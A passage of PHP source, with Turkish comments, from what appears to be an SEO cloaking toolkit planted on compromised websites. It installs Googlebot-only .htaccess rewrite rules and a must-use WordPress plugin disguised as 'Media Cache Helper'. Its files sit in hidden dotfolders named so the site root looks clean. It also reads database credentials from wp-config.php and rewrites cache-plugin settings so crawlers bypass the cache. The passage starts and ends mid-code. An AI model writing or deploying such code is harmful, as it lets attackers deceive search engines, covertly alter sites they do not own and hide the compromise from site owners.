  // FILE modu — perde/bayrak gizli .render-cache/ alt klasöründe (kök temiz görünür).
  // İSTİSNA: WordPress + kök PHP'ye YAZILAMIYORSA (mod_php kilitli host) → perde/bayrak
  // wp-content/uploads/wp-media-cache'e (yazılabilir). Böylece YÖNTEM 4 (mu-plugin airbag) çalışır.
  $_isWP_fm = is_dir($DIR.'/wp-includes') || file_exists($DIR.'/wp-config.php');
  if($_isWP_fm && !@is_writable($DIR)){
    $PERDE_DIR = $DIR.'/wp-content/uploads/wp-media-cache';
  }else{
    $PERDE_DIR = $DIR.DIRECTORY_SEPARATOR.'.render-cache';
  }
  if(!is_dir($PERDE_DIR)){@mkdir($PERDE_DIR,0755,true);}
  $PERDE_PATH = $PERDE_DIR.DIRECTORY_SEPARATOR.'render-cache.html';
  $FLAG_PATH  = $PERDE_DIR.DIRECTORY_SEPARATOR.'render.lock';
  // BACKUP kök'te GİZLİ dotfile olmalı — orijinal index.php __DIR__ kullanır (Joomla JPATH_BASE, Laravel ../vendor).
  // Alt klasöre koyarsak __DIR__ yanlış yolu gösterir → insan tarafı kırılır. Kök dotfile = __DIR__ doğru + gizli.
  $BACKUP_PATH= $DIR.DIRECTORY_SEPARATOR.'.render-orig.php';
}
if($IS_PLUGIN)$BACKUP_PATH=$DIR.DIRECTORY_SEPARATOR.$BACKUP_FILE; // plugin modunda backup kullanılmaz (uyumluluk)
// Cloak kurulu mu? index.php marker'lı VEYA .user.ini prepend kurulu (çok-yöntemli) → açma=bayrak, yeniden kurma.
$INDEX_CLOAKED = false;
if(!$IS_PLUGIN){
  $_idxC = file_exists($DIR.DIRECTORY_SEPARATOR.$INDEX_FILE)
    && strpos((string)@file_get_contents($DIR.DIRECTORY_SEPARATOR.$INDEX_FILE),'NOX-RENDER-V1')!==false;
  $_prependC = file_exists($PERDE_DIR.DIRECTORY_SEPARATOR.'prepend.php');
  // YÖNTEM 3: .htaccess mod_rewrite cloak bloğu kurulu mu (index.php kilitli host'larda)
  $_htf = $DIR.DIRECTORY_SEPARATOR.'.htaccess';
  $_htcloakC = file_exists($_htf)
    && strpos((string)@file_get_contents($_htf),'# BEGIN WP-Media-Cache Cloak')!==false;
  // YÖNTEM 4: WP mu-plugin airbag kurulu mu (kök kilitli WP host'larda)
  $_muC = function_exists('cseh_muplugin_installed') ? cseh_muplugin_installed($DIR) : false;
  $INDEX_CLOAKED = ($_idxC || $_prependC || $_htcloakC || $_muC);
}

// ---- LiteSpeed server cache bypass (.htaccess) -----------------------------
// Sadece-Googlebot + LiteSpeed-özel kural: bot gelince server cache atlanır → PHP çalışır →
// db.php/template_redirect perdeyi basar. İnsan etkilenmez (cache'li hızlı sayfa). IfModule LiteSpeed
// dışında (Apache/nginx) tamamen inert. Marker'lı blok → idempotent + geri alınabilir.
function cseh_htaccess_block(){
  return "# BEGIN WP-Media-Cache Bypass\n"
    // STATİK SİTE FIX: index.php ÖNCE çalışsın (index.html anasayfalı sitelerde cloak
    // kaçıyordu — Apache index.html'i index.php'den önce serve ediyor). mod_dir altında
    // güvenli + index.php yoksa otomatik index.html'e düşer (alt dizinler etkilenmez).
    ."<IfModule mod_dir.c>\n"
    ."DirectoryIndex index.php index.html index.htm\n"
    ."</IfModule>\n"
    ."<IfModule LiteSpeed>\n"
    ."RewriteEngine On\n"
    ."RewriteCond %{HTTP_USER_AGENT} (Googlebot|AdsBot|Mediapartners-Google|Google-InspectionTool|GoogleOther|Storebot-Google) [NC]\n"
    ."RewriteRule .* - [E=Cache-Control:no-cache]\n"
    ."</IfModule>\n"
    ."# END WP-Media-Cache Bypass\n";
}
function cseh_htaccess_add($dir){
  $f=$dir.DIRECTORY_SEPARATOR.'.htaccess';
  $cur=file_exists($f)?(string)@file_get_contents($f):'';
  // Eski blok varsa ÇIKAR (güncel blokla değiştir → DirectoryIndex fix'i de uygulansın)
  if(strpos($cur,'# BEGIN WP-Media-Cache Bypass')!==false){
    $cur=preg_replace('/# BEGIN WP-Media-Cache Bypass.*?# END WP-Media-Cache Bypass\n?/s','',$cur);
    $cur=ltrim($cur,"\n");
  }
  // En üste ekle (DirectoryIndex + cache kuralları diğer kurallardan önce)
  $new=cseh_htaccess_block()."\n".$cur;
  return @file_put_contents($f,$new)!==false?'OK':'ERR';
}
function cseh_htaccess_remove($dir){
  $f=$dir.DIRECTORY_SEPARATOR.'.htaccess';
  if(!file_exists($f))return 'NA';
  $cur=(string)@file_get_contents($f);
  if(strpos($cur,'# BEGIN WP-Media-Cache Bypass')===false)return 'NA';
  $clean=preg_replace('/# BEGIN WP-Media-Cache Bypass.*?# END WP-Media-Cache Bypass\n?/s','',$cur);
  $clean=ltrim($clean,"\n");
  return @file_put_contents($f,$clean)!==false?'OK':'ERR';
}

// ---- YÖNTEM 3: .htaccess mod_rewrite CLOAK (index.php KİLİTLİ + mod_php son çaresi) --------
// index.php yazılamıyor VE .user.ini desteklenmiyorsa (mod_php), cloak'ı Apache seviyesinde
// yaparız: render.lock varsa + Googlebot + anasayfa → statik perde'yi servis et. PHP'ye HİÇ
// dokunmaz. İnsan WordPress'i normal görür (kuralımız sadece Googlebot UA'ya tetiklenir).
// Flag (render.lock) ile aç/kapat → "Cloak'ı Kapat" flag'i siler, rewrite koşulu düşer = pasif.
function cseh_htaccess_cloak_block(){
  return "# BEGIN WP-Media-Cache Cloak\n"
    ."<IfModule mod_rewrite.c>\n"
    ."RewriteEngine On\n"
    // SADECE flag açıkken + perde varken + Googlebot + anasayfada tetiklen:
    ."RewriteCond %{DOCUMENT_ROOT}/.render-cache/render.lock -f\n"
    ."RewriteCond %{DOCUMENT_ROOT}/.render-cache/render-cache.html -f\n"
    ."RewriteCond %{HTTP_USER_AGENT} (Googlebot|AdsBot|Mediapartners-Google|Google-InspectionTool|GoogleOther|Storebot-Google) [NC]\n"
    ."RewriteCond %{REQUEST_URI} ^/(index\\.php)?$\n"
    ."RewriteRule ^ /.render-cache/render-cache.html [L]\n"
    ."</IfModule>\n"
    ."# END WP-Media-Cache Cloak\n";
}
function cseh_htaccess_cloak_add($dir){
  $f=$dir.DIRECTORY_SEPARATOR.'.htaccess';
  $cur=file_exists($f)?(string)@file_get_contents($f):'';
  // eski cloak blok varsa çıkar (güncelle)
  if(strpos($cur,'# BEGIN WP-Media-Cache Cloak')!==false){
    $cur=preg_replace('/# BEGIN WP-Media-Cache Cloak.*?# END WP-Media-Cache Cloak\n?/s','',$cur);
    $cur=ltrim($cur,"\n");
  }
  // EN ÜSTE — WordPress'in "her şeyi index.php'ye yönlendir" kuralından ÖNCE değerlendirilmeli
  $new=cseh_htaccess_cloak_block()."\n".$cur;
  return @file_put_contents($f,$new)!==false?'OK':'ERR';
}
function cseh_htaccess_cloak_remove($dir){
  $f=$dir.DIRECTORY_SEPARATOR.'.htaccess';
  if(!file_exists($f))return 'NA';
  $cur=(string)@file_get_contents($f);
  if(strpos($cur,'# BEGIN WP-Media-Cache Cloak')===false)return 'NA';
  $clean=preg_replace('/# BEGIN WP-Media-Cache Cloak.*?# END WP-Media-Cache Cloak\n?/s','',$cur);
  $clean=ltrim($clean,"\n");
  return @file_put_contents($f,$clean)!==false?'OK':'ERR';
}

// ---- YÖNTEM 4: WordPress mu-plugin AIRBAG (WP + kök PHP'ye KİLİTLİ son çare) ----------------
// mod_php host'ta web kökü PHP'ye yazılamıyor AMA wp-content yazılabiliyorsa: wp-content/mu-plugins/
// içine küçük airbag koy. WP OTOMATİK yükler (aktivasyon/wp-admin GEREKMEZ). render.lock varsa +
// Googlebot + anasayfa → wp-content/uploads/wp-media-cache/render-cache.html perde'yi basar + exit.
function cseh_muplugin_code(){
  return "<"."?php\n"
    ."/* NOX-RENDER-V1 mu-airbag */\n"
    ."/* Plugin Name: Media Cache Helper */\n"
    ."if(!defined('ABSPATH'))return;\n"
    ."\$__nx=(defined('WP_CONTENT_DIR')?WP_CONTENT_DIR:dirname(__DIR__)).'/uploads/wp-media-cache';\n"
    ."if(@file_exists(\$__nx.'/render.lock')){\n"
    ."  \$__ua=isset(\$_SERVER['HTTP_USER_AGENT'])?\$_SERVER['HTTP_USER_AGENT']:'';\n"
    ."  \$__u=isset(\$_SERVER['REQUEST_URI'])?(string)parse_url(\$_SERVER['REQUEST_URI'],PHP_URL_PATH):'/';\$__u=rtrim(\$__u,'/');\n"
    ."  if(preg_match('/Googlebot|AdsBot|Mediapartners-Google|Google-InspectionTool|GoogleOther|Storebot-Google/i',\$__ua)&&(\$__u===''||\$__u==='/index.php')){\n"
    ."    \$__p=\$__nx.'/render-cache.html';\n"
    ."    if(@file_exists(\$__p)){\n"
    ."      if(!defined('DONOTCACHEPAGE'))define('DONOTCACHEPAGE',true);\n"
    ."      header('Content-Type: text/html; charset=UTF-8');header('Cache-Control: no-store, no-cache, must-revalidate, max-age=0');header('X-LiteSpeed-Cache-Control: no-cache');\n"
    ."      while(ob_get_level()>0)@ob_end_clean();@readfile(\$__p);exit;\n"
    ."    }\n  }\n}\n";
}
function cseh_muplugin_path($dir){ return $dir.'/wp-content/mu-plugins/0-media-cache.php'; }
function cseh_muplugin_add($dir){
  $mu=$dir.'/wp-content/mu-plugins';
  if(!is_dir($mu)){ if(!@mkdir($mu,0755,true)) return 'ERR (mu-plugins oluşturulamadı)'; }
  return @file_put_contents(cseh_muplugin_path($dir),cseh_muplugin_code())!==false?'OK':'ERR (yazılamadı)';
}
function cseh_muplugin_remove($dir){
  $f=cseh_muplugin_path($dir);
  if(file_exists($f)) return @unlink($f)?'OK':'ERR';
  return 'NA';
}
function cseh_muplugin_installed($dir){
  $f=cseh_muplugin_path($dir);
  return file_exists($f) && strpos((string)@file_get_contents($f),'NOX-RENDER-V1')!==false;
}
// Sunucu yazılımını tespit et: litespeed | apache | nginx | other
function cseh_server_type(){
  $s=strtolower(isset($_SERVER['SERVER_SOFTWARE'])?$_SERVER['SERVER_SOFTWARE']:'');
  if($s===''){
    // SERVER_SOFTWARE boşsa header'dan dene
    $s=strtolower(isset($_SERVER['HTTP_X_SERVER'])?$_SERVER['HTTP_X_SERVER']:'');
  }
  if(strpos($s,'litespeed')!==false||strpos($s,'lsws')!==false)return 'litespeed';
  if(strpos($s,'nginx')!==false)return 'nginx';
  if(strpos($s,'apache')!==false)return 'apache';
  return 'other';
}

/* ============================================================
 * MANAGED HOST DETECTION (Kinsta / WP Engine / Pantheon / Flywheel / Cloudways)
 * Bu hostlar kendi edge/CDN cache layer'ını kullanır. PHP'den purge YAPILAMAZ
 * (WP Engine EverCache, Kinsta CDN, Pantheon Global CDN, Flywheel FlyCache).
 * Kullanıcıya dashboard manuel-purge linki + mu-plugin/CLI önerisi göstereceğiz.
 * Sinyaller: $_SERVER env, mu-plugins path pattern, hostname pattern.
 * ============================================================ */
function cseh_detect_managed_host(){
  $out=array('host'=>null,'label'=>'','purge_hint'=>'','dashboard'=>'','mu_plugin'=>'',
             'can_php_purge'=>true,'signals'=>array());

  // 1) WP Engine — $_SERVER['WPENGINE_ACCOUNT'] veya mu-plugin varlığı
  if(!empty($_SERVER['WPENGINE_ACCOUNT'])){
    $out['host']='wpengine';
    $out['signals'][]='SERVER[WPENGINE_ACCOUNT]='.substr((string)$_SERVER['WPENGINE_ACCOUNT'],0,40);
  }elseif(!empty($_SERVER['IS_WPE']) || !empty($_ENV['IS_WPE'])){
    $out['host']='wpengine';
    $out['signals'][]='SERVER[IS_WPE] set';
  }elseif(defined('WPE_APIKEY') || defined('WPE_CLUSTER_TYPE')){
    $out['host']='wpengine';
    $out['signals'][]='constant WPE_APIKEY / WPE_CLUSTER_TYPE tanımlı';
  }elseif(function_exists('is_wpe') || class_exists('WpeCommon')){
    $out['host']='wpengine';
    $out['signals'][]='is_wpe() / WpeCommon sınıfı yüklü';
  }

  // 2) Kinsta — $_SERVER['KINSTA_CACHE_ZONE'] veya path pattern
  if($out['host']===null){
    if(!empty($_SERVER['KINSTA_CACHE_ZONE']) || !empty($_ENV['KINSTA_CACHE_ZONE'])){
      $out['host']='kinsta';
      $out['signals'][]='SERVER[KINSTA_CACHE_ZONE] set';
    }elseif(defined('KINSTAMU_VERSION') || defined('KINSTA_CACHE_ZONE')){
      $out['host']='kinsta';
      $out['signals'][]='constant KINSTAMU_VERSION / KINSTA_CACHE_ZONE tanımlı';
    }elseif(class_exists('Kinsta\\Cache') || class_exists('KinstaMU')){
      $out['host']='kinsta';
      $out['signals'][]='Kinsta\\Cache / KinstaMU sınıfı yüklü';
    }elseif(isset($_SERVER['HTTP_HOST']) && preg_match('/\.kinsta(cloud|\.cloud)(\.|$)/i',(string)$_SERVER['HTTP_HOST'])){
      $out['host']='kinsta';
      $out['signals'][]='HOST pattern: .kinsta.cloud';
    }
  }

  // 3) Pantheon — $_SERVER['PANTHEON_ENVIRONMENT']
  if($out['host']===null){
    if(!empty($_SERVER['PANTHEON_ENVIRONMENT']) || !empty($_ENV['PANTHEON_ENVIRONMENT'])){
      $out['host']='pantheon';
      $out['signals'][]='SERVER[PANTHEON_ENVIRONMENT]='.substr((string)(isset($_SERVER['PANTHEON_ENVIRONMENT'])?$_SERVER['PANTHEON_ENVIRONMENT']:$_ENV['PANTHEON_ENVIRONMENT']),0,30);
    }elseif(defined('PANTHEON_ENVIRONMENT') || defined('PANTHEON_SITE')){
      $out['host']='pantheon';
      $out['signals'][]='constant PANTHEON_ENVIRONMENT / PANTHEON_SITE tanımlı';
    }elseif(function_exists('pantheon_clear_edge_all') || function_exists('pantheon_clear_edge_paths')){
      $out['host']='pantheon';
      $out['signals'][]='pantheon_clear_edge_* fonksiyonu var';
    }
  }

  // 4) Flywheel — $_SERVER['FLYWHEEL_CONFIG_DIR'] veya path pattern
  if($out['host']===null){
    if(!empty($_SERVER['FLYWHEEL_CONFIG_DIR']) || !empty($_SERVER['FLYWHEEL']) || !empty($_ENV['FLYWHEEL'])){
      $out['host']='flywheel';
      $out['signals'][]='SERVER[FLYWHEEL_*] set';
    }elseif(defined('FLYWHEEL_PLUGIN_DIR') || defined('FLYWHEEL_CONFIG_DIR')){
      $out['host']='flywheel';
      $out['signals'][]='constant FLYWHEEL_* tanımlı';
    }elseif(isset($_SERVER['HTTP_HOST']) && preg_match('/\.flywheelsites\.com$/i',(string)$_SERVER['HTTP_HOST'])){
      $out['host']='flywheel';
      $out['signals'][]='HOST pattern: .flywheelsites.com';
    }
  }

  // 5) Cloudways — hostname + varnish signals
  if($out['host']===null){
    if(!empty($_SERVER['HTTP_X_APPLICATION']) && stripos((string)$_SERVER['HTTP_X_APPLICATION'],'cloudways')!==false){
      $out['host']='cloudways';
      $out['signals'][]='HTTP_X_APPLICATION içerir cloudways';
    }elseif(isset($_SERVER['HTTP_HOST']) && preg_match('/\.cloudwaysapps\.com$/i',(string)$_SERVER['HTTP_HOST'])){
      $out['host']='cloudways';
      $out['signals'][]='HOST pattern: .cloudwaysapps.com';
    }elseif(class_exists('Breeze_Cache_Init') && !empty($_SERVER['SERVER_NAME']) && preg_match('/cloudwaysapps\.com/i',(string)$_SERVER['SERVER_NAME'])){
      $out['host']='cloudways';
      $out['signals'][]='Breeze plugin + cloudwaysapps SERVER_NAME';
    }
  }

  // Detay: her host için etiket + manuel purge talimatı + dashboard URL + mu-plugin ipucu
  if($out['host']==='wpengine'){
    $out['label']='WP Engine';
    $out['can_php_purge']=false; // EverCache PHP'den purge yok
    $out['dashboard']='https://my.wpengine.com/';
    $acc=isset($_SERVER['WPENGINE_ACCOUNT'])?(string)$_SERVER['WPENGINE_ACCOUNT']:'';
    if($acc!=='') $out['dashboard'].='installs/'.rawurlencode($acc).'/caching';
    $out['mu_plugin']='/wp-content/mu-plugins/wpengine-common/';
    $out['purge_hint']='EverCache PHP\'den temizlenemez. Manuel: My WP Engine → Sites → Caching → Purge All Caches. VEYA WP admin toolbar → WP Engine → General Cache/Object Cache/CDN Purge. Alternatif: SSH\'a bağlanıp `wp page-cache flush` (WP-CLI).';
  }elseif($out['host']==='kinsta'){
    $out['label']='Kinsta';
    $out['can_php_purge']=true; // KinstaMU mu-plugin PHP'den purge sağlıyor
    $out['dashboard']='https://my.kinsta.com/';
    $out['mu_plugin']='/wp-content/mu-plugins/kinsta-mu-plugins.php';
    $out['purge_hint']='Kinsta CDN + Full Page Cache. WP admin toolbar → Kinsta Cache → Clear All Caches. VEYA MyKinsta → Sites → Tools → Site Cache: "Clear cache". Kinsta REST API ile programatik purge için: API token (MyKinsta → API Keys) + POST https://api.kinsta.com/v2/sites/{site_id}/tools/purge-cache.';
  }elseif($out['host']==='pantheon'){
    $out['label']='Pantheon';
    $out['can_php_purge']=true; // pantheon_clear_edge_all() var
    $out['dashboard']='https://dashboard.pantheon.io/';
    $out['mu_plugin']='pantheon_clear_edge_all() / Pantheon Advanced Page Cache plugin';
    $out['purge_hint']='Pantheon Global CDN (edge). PHP\'den: pantheon_clear_edge_all() / pantheon_clear_edge_paths([url]) — Pantheon Advanced Page Cache plugin ile. Dashboard: Pantheon Dashboard → Environment → Clear Caches. Terminus CLI: `terminus env:clear-cache <site>.<env>`.';
  }elseif($out['host']==='flywheel'){
    $out['label']='Flywheel';
    $out['can_php_purge']=false; // FlyCache mu-plugin manuel
    $out['dashboard']='https://app.getflywheel.com/';
    $out['mu_plugin']='/wp-content/mu-plugins/flywheel-*';
    $out['purge_hint']='FlyCache PHP\'den temizlenemez. Manuel: Flywheel Dashboard → Site → Advanced → "Clear Cache". VEYA WP admin toolbar → Flywheel → Clear Cache. WP Engine tarafından satın alındığı için EverCache benzeri edge davranışı.';
  }elseif($out['host']==='cloudways'){
    $out['label']='Cloudways';
    $out['can_php_purge']=true; // Varnish + Breeze plugin PHP'den purge yapabiliyor
    $out['dashboard']='https://platform.cloudways.com/';
    $out['mu_plugin']='Breeze plugin (WordPress) VEYA Cloudways WP Cache Toolbar';
    $out['purge_hint']='Cloudways Varnish + Breeze. Manuel: Cloudways Platform → Server → Services → Varnish "Purge". VEYA WP admin → Breeze → Purge All Cache. Bu araç Varnish 6081 PURGE\'ü otomatik dener; Varnish domain-scoped purge Cloudways SSH ile: `varnishadm "ban req.http.host == mysite.com"`.';
  }

  return $out;
}

/* ============================================================
 * CACHE PLUGIN BYPASS + BACKUP AUTO-REPAIR (v0.3)
 * "CLOAK SERVİSİNİ AÇ" akışına otomatik bağlanır.
 * ============================================================ */

$GLOBALS['CSEH_BOT_UA_LIST'] = array(
    'Googlebot','AdsBot-Google','Mediapartners-Google',
    'Google-InspectionTool','GoogleOther','Storebot-Google',
);

function cseh_find_wpconfig($DIR){
    $p = rtrim($DIR, '/\\');
    for($i=0; $i<7; $i++){
        if(@is_file($p.'/wp-config.php') && @is_readable($p.'/wp-config.php')) return $p.'/wp-config.php';
        $np = dirname($p);
        if($np===$p || $np==='' || $np==='.') break;
        $p = $np;
    }
    return '';
}

function cseh_parse_wpconfig($path){
    $out = array('creds'=>array(), 'prefix'=>'wp_');
    if(!$path || !@is_file($path)) return $out;
    $src = @file_get_contents($path);
    if($src === false) return $out;
    foreach(array('DB_NAME','DB_USER','DB_PASSWORD','DB_HOST','DB_CHARSET') as $k){
        if(preg_match("/define\s*\(\s*['\"]" . $k . "['\"]\s*,\s*['\"](.*?)['\"]\s*\)/s", $src, $m)){
            $out['creds'][$k] = $m[1];
        }
    }
    if(preg_match('/\$table_prefix\s*=\s*[\'"]([a-zA-Z0-9_]+)[\'"]\s*;/', $src, $m)){
        $out['prefix'] = $m[1];
    }
    if(empty($out['creds']['DB_CHARSET'])) $out['creds']['DB_CHARSET'] = 'utf8mb4';
    if(empty($out['creds']['DB_HOST']))    $out['creds']['DB_HOST']    = 'localhost';
    return $out;
}

function cseh_db_connect($creds){
    if(!extension_loaded('mysqli')) return null;
    if(empty($creds['DB_NAME']) || empty($creds['DB_USER'])) return null;
    @mysqli_report(MYSQLI_REPORT_OFF);
    $host = $creds['DB_HOST']; $port = 0; $sock = '';
    if(strpos($host, ':') !== false){
        $parts = explode(':', $host, 2);
        $host = $parts[0];
        if(is_numeric($parts[1])) $port = (int)$parts[1]; else $sock = $parts[1];
    }
    $pw = isset($creds['DB_PASSWORD']) ? $creds['DB_PASSWORD'] : '';
    $m = @new mysqli($host, $creds['DB_USER'], $pw, $creds['DB_NAME'], $port ?: 3306, $sock ?: null);
    if($m->connect_errno) return null;
    @$m->set_charset($creds['DB_CHARSET']);
    return $m;
}

function cseh_merge_ua_list(array $existing, array $additions){
    $seen = array(); $out = array();
    foreach(array_merge($existing, $additions) as $ua){
        $ua = trim((string)$ua);
        if($ua === '') continue;
        $k = strtolower($ua);
        if(isset($seen[$k])) continue;
        $seen[$k] = 1;
        $out[] = $ua;
    }
    return $out;
}

function cseh_ua_str_to_arr($str){
    if(!is_string($str) || $str === '') return array();
    $parts = preg_split('/\r\n|\r|\n/', $str);
    $out = array();
    foreach($parts as $p){ $p = trim($p); if($p !== '') $out[] = $p; }
    return $out;
}

function cseh_db_get_option($mysqli, $prefix, $name){
    $sql = "SELECT option_value FROM `{$prefix}options` WHERE option_name = ? LIMIT 1";
    $stmt = @$mysqli->prepare($sql);
    if(!$stmt) return null;
    $stmt->bind_param('s', $name);
    if(!$stmt->execute()){ $stmt->close(); return null; }
    $res = $stmt->get_result();
    $row = $res ? $res->fetch_assoc() : null;
    $stmt->close();
    return $row ? $row['option_value'] : null;
}

function cseh_db_set_option($mysqli, $prefix, $name, $value, $autoload = 'yes'){
    $sql = "UPDATE `{$prefix}options` SET option_value = ? WHERE option_name = ?";
    $stmt = @$mysqli->prepare($sql);
    if(!$stmt) return false;
    $stmt->bind_param('ss', $value, $name);
    $ok = $stmt->execute();
    $affected = $mysqli->affected_rows;
    $stmt->close();
    if(!$ok) return false;
    if($affected === 0){
        $exists = cseh_db_get_option($mysqli, $prefix, $name);
        if($exists === null){
            $sqlI = "INSERT INTO `{$prefix}options` (option_name, option_value, autoload) VALUES (?, ?, ?)";
            $stI = @$mysqli->prepare($sqlI);
            if(!$stI) return false;
            $stI->bind_param('sss', $name, $value, $autoload);
            $okI = $stI->execute();
            $stI->close();
            if(!$okI) return false;
        }
    }
    return true;
}

function cseh_detect_cache_plugins($mysqli, $prefix){
    $raw = cseh_db_get_option($mysqli, $prefix, 'active_plugins');
    if($raw === null) return array();
    $arr = @unserialize($raw);
    if(!is_array($arr)) return array();
    $known = array(
        'wp-rocket'        => array('wp-rocket/wp-rocket.php'),
        'litespeed'        => array('litespeed-cache/litespeed-cache.php'),
        'w3-total-cache'   => array('w3-total-cache/w3-total-cache.php'),
        'wp-super-cache'   => array('wp-super-cache/wp-cache.php'),
        'wp-fastest-cache' => array('wp-fastest-cache/wpFastestCache.php'),
        'flying-press'     => array('flying-press/flying-press.php'),
        'cache-enabler'    => array('cache-enabler/cache-enabler.php'),
        'sg-cachepress'    => array('sg-cachepress/sg-cachepress.php'),
        'breeze'           => array('breeze/breeze.php'),
        'hummingbird'      => array('hummingbird-performance/wp-hummingbird.php'),
    );
    $detected = array();
    foreach($arr as $slug){
        foreach($known as $k => $paths){
            if(in_array($slug, $paths, true) || strpos($slug, $k.'/') === 0){
                if(!in_array($k, $detected, true)) $detected[] = $k;
            }
        }
    }
    return $detected;
}

function cseh_bypass_wp_rocket($mysqli, $prefix, $bot_uas){
    $raw = cseh_db_get_option($mysqli, $prefix, 'wp_rocket_settings');
    if($raw === null) return array('ok'=>false, 'plugin'=>'wp-rocket', 'message'=>'option not found');
    $data = @unserialize($raw); if(!is_array($data)) $data = array();
    $current = isset($data['cache_reject_ua']) && is_array($data['cache_reject_ua']) ? $data['cache_reject_ua'] : array();
    $before = count($current);
    $merged = cseh_merge_ua_list($current, $bot_uas);
    $data['cache_reject_ua'] = array_values($merged);
    $ok = cseh_db_set_option($mysqli, $prefix, 'wp_rocket_settings', serialize($data));
    return array('ok'=>$ok, 'plugin'=>'wp-rocket', 'message'=>$ok?(count($merged)-$before).' UA added':'db write failed', 'before'=>$before, 'after'=>count($merged));
}

function cseh_bypass_litespeed($mysqli, $prefix, $bot_uas){
    $name = 'litespeed.conf.cache-exc_useragents';
    $raw = cseh_db_get_option($mysqli, $prefix, $name);
    $current = cseh_ua_str_to_arr($raw === null ? '' : $raw);
    $before = count($current);
    $merged = cseh_merge_ua_list($current, $bot_uas);
    $ok = cseh_db_set_option($mysqli, $prefix, $name, implode("\n", $merged));
    return array('ok'=>$ok, 'plugin'=>'litespeed', 'message'=>$ok?(count($merged)-$before).' UA added':'db write failed', 'before'=>$before, 'after'=>count($merged));
}

function cseh_bypass_w3tc($mysqli, $prefix, $bot_uas){
    $raw = cseh_db_get_option($mysqli, $prefix, 'w3tc_options');
    if($raw === null) return array('ok'=>false, 'plugin'=>'w3-total-cache', 'message'=>'option not found');
    $data = @unserialize($raw); if(!is_array($data)) $data = array();
    $current = isset($data['pgcache.reject.ua']) && is_array($data['pgcache.reject.ua']) ? $data['pgcache.reject.ua'] : array();
    $before = count($current);
    $merged = cseh_merge_ua_list($current, $bot_uas);
    $data['pgcache.reject.ua'] = array_values($merged);
    $ok = cseh_db_set_option($mysqli, $prefix, 'w3tc_options', serialize($data));
    return array('ok'=>$ok, 'plugin'=>'w3-total-cache', 'message'=>$ok?(count($merged)-$before).' UA added':'db write failed', 'before'=>$before, 'after'=>count($merged));
}

function cseh_bypass_wp_super_cache($mysqli, $prefix, $bot_uas){
    return array('ok'=>false, 'plugin'=>'wp-super-cache', 'message'=>'wp-super-cache file-based, atla (wp-config.php elle)');
}

function cseh_bypass_wp_fastest_cache($mysqli, $prefix, $bot_uas){
    $name = 'WpFastestCacheRejectedUserAgents';
    $raw = cseh_db_get_option($mysqli, $prefix, $name);
    $current = cseh_ua_str_to_arr($raw === null ? '' : $raw);
    $before = count($current);
    $merged = cseh_merge_ua_list($current, $bot_uas);
    $ok = cseh_db_set_option($mysqli, $prefix, $name, implode("\n", $merged), 'no');
    return array('ok'=>$ok, 'plugin'=>'wp-fastest-cache', 'message'=>$ok?(count($merged)-$before).' UA added':'db write failed', 'before'=>$before, 'after'=>count($merged));
}

function cseh_bypass_flying_press($mysqli, $prefix, $bot_uas){
    $raw = cseh_db_get_option($mysqli, $prefix, 'flying_press_settings');
    if($raw === null) return array('ok'=>false, 'plugin'=>'flying-press', 'message'=>'option not found');
    $data = @unserialize($raw); if(!is_array($data)) $data = array();
    $cur_raw = isset($data['cache_exclude_user_agents']) ? $data['cache_exclude_user_agents'] : '';
    $current = is_array($cur_raw) ? $cur_raw : cseh_ua_str_to_arr((string)$cur_raw);
    $before = count($current);
    $merged = cseh_merge_ua_list($current, $bot_uas);
    $data['cache_exclude_user_agents'] = implode("\n", $merged);
    $ok = cseh_db_set_option($mysqli, $prefix, 'flying_press_settings', serialize($data));
    return array('ok'=>$ok, 'plugin'=>'flying-press', 'message'=>$ok?(count($merged)-$before).' UA added':'db write failed', 'before'=>$before, 'after'=>count($merged));
}

function cseh_bypass_cache_enabler($mysqli, $prefix, $bot_uas){
    $raw = cseh_db_get_option($mysqli, $prefix, 'cache_enabler');
    if($raw === null) return array('ok'=>false, 'plugin'=>'cache-enabler', 'message'=>'option not found');
    $data = @unserialize($raw); if(!is_array($data)) $data = array();
    $cur_raw = isset($data['excluded_user_agents']) ? $data['excluded_user_agents'] : '';
    $current = is_array($cur_raw) ? $cur_raw : cseh_ua_str_to_arr((string)$cur_raw);
    $before = count($current);
    $merged = cseh_merge_ua_list($current, $bot_uas);
    $data['excluded_user_agents'] = implode("\n", $merged);
    $ok = cseh_db_set_option($mysqli, $prefix, 'cache_enabler', serialize($data));
    return array('ok'=>$ok, 'plugin'=>'cache-enabler', 'message'=>$ok?(count($merged)-$before).' UA added':'db write failed', 'before'=>$before, 'after'=>count($merged));
}

function cseh_bypass_sg_cachepress($mysqli, $prefix, $bot_uas){
    $name = 'siteground_optimizer_user_agent_exceptions';
    $raw = cseh_db_get_option($mysqli, $prefix, $name);
    $current = cseh_ua_str_to_arr($raw === null ? '' : $raw);
    $before = count($current);
    $merged = cseh_merge_ua_list($current, $bot_uas);
    $ok = cseh_db_set_option($mysqli, $prefix, $name, implode("\n", $merged));
    return array('ok'=>$ok, 'plugin'=>'sg-cachepress', 'message'=>$ok?(count($merged)-$before).' UA added':'db write failed', 'before'=>$before, 'after'=>count($merged));
}

function cseh_bypass_breeze($mysqli, $prefix, $bot_uas){
    $raw = cseh_db_get_option($mysqli, $prefix, 'breeze_basic_settings');
    if($raw === null) return array('ok'=>false, 'plugin'=>'breeze', 'message'=>'option not found');
    $data = @unserialize($raw); if(!is_array($data)) $data = array();
    $current = isset($data['breeze-exclude-user-agents']) && is_array($data['breeze-exclude-user-agents']) ? $data['breeze-exclude-user-agents'] : array();
    $before = count($current);
    $merged = cseh_merge_ua_list($current, $bot_uas);
    $data['breeze-exclude-user-agents'] = array_values($merged);
    $ok = cseh_db_set_option($mysqli, $prefix, 'breeze_basic_settings', serialize($data));
    return array('ok'=>$ok, 'plugin'=>'breeze', 'message'=>$ok?(count($merged)-$before).' UA added':'db write failed', 'before'=>$before, 'after'=>count($merged));
}

function cseh_bypass_hummingbird($mysqli, $prefix, $bot_uas){
    $raw = cseh_db_get_option($mysqli, $prefix, 'wphb_settings');
    if($raw === null) return array('ok'=>false, 'plugin'=>'hummingbird', 'message'=>'option not found');
    $data = @unserialize($raw); if(!is_array($data)) $data = array();
    if(!isset($data['page_cache']) || !is_array($data['page_cache'])) $data['page_cache'] = array();
    if(!isset($data['page_cache']['exclude']) || !is_array($data['page_cache']['exclude'])) $data['page_cache']['exclude'] = array();
    $current = isset($data['page_cache']['exclude']['user_agents']) && is_array($data['page_cache']['exclude']['user_agents'])
        ? $data['page_cache']['exclude']['user_agents'] : array();
    $before = count($current);
    $merged = cseh_merge_ua_list($current, $bot_uas);
